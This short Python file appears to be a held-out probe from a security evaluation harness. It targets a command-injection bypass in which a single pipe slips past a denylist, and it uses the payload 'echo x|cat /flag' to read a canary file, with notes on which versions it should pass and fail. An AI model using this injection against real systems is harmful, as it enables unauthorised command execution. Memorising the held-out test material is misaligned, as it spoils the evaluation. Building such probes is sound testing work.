#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-55578 residual exploit -- pipe metacharacter injection.

The CVE-2026-54540 fix (V1 = 2.0.5) added $ to the denylist, blocking $()
substitution. However it only checks for || (double pipe), not single |.
A single pipe metacharacter passes the denylist and lets the attacker chain
an arbitrary command after a legitimate one.

Payload: echo x|cat /flag
  - starts with 'echo' (in TERMINAL_COMMANDS allowlist)
  - 'echo x' is a valid command; pipe chains 'cat /flag'
  - shell_exec runs: echo x|cat /flag
  - the pipe causes cat /flag to execute, reading the canary

Contract: reaches the canary on V1 (2.0.5); BLOCKED on V2 (2.0.6) because
V2 denylists single | (and backtick, newline, carriage return).

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations


COMMAND = "echo x|cat /flag"


def candidate() -> dict:
    return {
        "probe_id": "cve-2026-55578-pipe-bypass",
        "method": "POST",
        "command": COMMAND,
    }


if __name__ == "__main__":
    print(COMMAND)
